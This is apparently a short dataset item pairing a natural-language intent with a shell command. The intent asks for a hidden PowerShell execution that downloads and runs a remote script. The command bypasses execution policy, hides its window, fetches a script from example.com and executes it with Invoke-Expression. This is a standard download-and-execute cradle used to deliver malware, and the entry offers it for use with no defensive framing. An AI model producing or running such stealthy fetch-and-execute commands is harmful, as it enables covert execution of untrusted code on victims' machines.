# Natural language intent:
# Execute a hidden PowerShell command to invoke a web request and download/execute a script from a specific site.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
